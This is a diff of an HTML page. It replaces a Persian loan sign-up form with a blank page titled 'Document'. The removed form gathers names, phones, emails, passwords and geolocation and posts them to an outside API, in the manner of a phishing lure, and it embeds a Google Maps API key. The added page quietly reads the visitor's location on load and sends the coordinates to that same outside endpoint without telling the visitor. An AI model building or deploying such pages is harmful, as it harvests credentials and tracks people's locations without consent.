@@ -1,180 +1,50 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>وام قرن</title>
-    <style>
-        body {
-            background-image: url(./static/images.jpg);
-            background-repeat: no-repeat;
-            background-size: cover;
-            background-position: center;
-            height: 100vh;
-            max-width: 100%;
-        }
-        body::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #000;
-            opacity: 0.5;
-            z-index: 1;
-        }
-        .container {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 2;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-        .container .part2 {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            max-width: 100%;
-        }
-        .container .part2 input {
-            width: 100%;
-            border-radius: 5px;
-            padding: 10px;
-            border: 1px solid #ccc;
-        }
-        .error {
-            color: red;
-            font-size: 14px;
-            margin-top: -5px;
-            display: none;
-        }
-        #map {
-            width: 100%;
-            height: 300px;
-            margin-top: 20px;
-            border-radius: 10px;
-        }
-        .btn {
-            padding: 10px 20px;
-            margin-top: 10px;
-            background-color: #28a745;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-    </style>
+    <title>Document</title>
 </head>
 <body>
-    <div class="container">
-        <div class="part1">
-            <h1 style="color: #fff;">به سایت وام قرن خوش آمدید</h1>
-        </div>
-        <div class="part2">
-            <input id="name" placeholder="نام و نام خانوادگی" type="text"/>
-            <span class="error" id="nameError">نام و نام خانوادگی را وارد کنید.</span>
-
-            <input id="phone" placeholder="شماره تماس" type="text"/>
-            <span class="error" id="phoneError">شماره تماس معتبر وارد کنید.</span>
-
-            <input id="email" placeholder="ایمیل" type="text"/>
-            <span class="error" id="emailError">ایمیل معتبر وارد کنید.</span>
-
-            <input id="password" placeholder="رمز عبور" type="password"/>
-            <span class="error" id="passwordError">رمز عبور را وارد کنید.</span>
-
-            <button class="btn" onclick="validateAndSend()">ثبت‌نام</button>
-        </div>
-        <div class="part3">
-            <div id="map"></div>
-        </div>
-    </div>
     
-    <script>
-        let userLocation = null;
-
-        function getLocationAndSend() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const { latitude, longitude } = position.coords;
-                        userLocation = { lat: latitude, lng: longitude };
-                    },
-                    (error) => {
-                        console.error("خطا در دریافت موقعیت:", error.message);
-                    }
-                );
-            } else {
-                console.error("مرورگر شما از Geolocation پشتیبانی نمی‌کند.");
-            }
-        }
-
-        function validateAndSend() {
-
-            const name = document.getElementById("name").value.trim();
-            const phone = document.getElementById("phone").value.trim();
-            const email = document.getElementById("email").value.trim();
-            const password = document.getElementById("password").value.trim();
-
-            document.getElementById("nameError").style.display = name ? "none" : "block";
-            document.getElementById("phoneError").style.display = /^[0-9]{10,}$/.test(phone) ? "none" : "block";
-            document.getElementById("emailError").style.display = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) ? "none" : "block";
-            document.getElementById("passwordError").style.display = password ? "none" : "block";
-
-            if (!name || !/^[0-9]{10,}$/.test(phone) || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) || !password) {
-                return;
-            }
-            sendFormData(name, phone, email, password);
-        }
-
-        function sendFormData(nameAndLastname, phoneNumber, email, password) {
-            const data = {
-                nameAndLastname,
-                phoneNumber,
-                email,
-                password,
-                latitude: userLocation ? userLocation.lat : null,
-                longitude: userLocation ? userLocation.lng : null
-            };
-
-            fetch("https://datas.liara.run/api/data", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(result => alert("اطلاعات با موفقیت ثبت شد."))
-            .catch(error => alert("خطا در ارسال اطلاعات:", error));
-        }
-
-        function initMap() {
-            if (userLocation) {
-                console.log("salam");
-                const map = new google.maps.Map(document.getElementById("map"), {
-                    center: userLocation,
-                    zoom: 15,
-                });
-
-                new google.maps.Marker({
-                    position: userLocation,
-                    map: map,
-                    title: "موقعیت شما"
-                });
-            }
-        }
-
-        window.onload = getLocationAndSend;
-    </script>
-
-    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyA_tJ587ckTwMVkqtLZ3hw4PAffc77zNkA&callback=initMap"></script>
 </body>
+<script>
+   async function getLocation() {
+        let arz
+        let tool
+        if (navigator.geolocation) {
+          await navigator.geolocation.getCurrentPosition(
+                (position) => {
+                 arz = position.coords.latitude;
+                 tool = position.coords.longitude;
+                sendLocationToBack(arz , tool)
+                },
+                (error) => {
+                    console.error("خطا در دریافت موقعیت:", error.message);
+                }
+            );
+        } else {
+            console.error("مرورگر شما از Geolocation پشتیبانی نمی‌کند.");
+        }
+        return {
+            arz,
+            tool
+        }
+    }
+    function sendLocationToBack(arz , tool) {
+      const data = {
+        arz,
+        tool
+      }
+      console.log(data);
+        fetch('https://datas.liara.run/api/data' , {
+            method: 'POST',
+            headers: {
+        'Content-Type': 'application/json'
+    },
+            body:JSON.stringify(data)
+        })
+    }
+    getLocation()
+</script>
 </html>
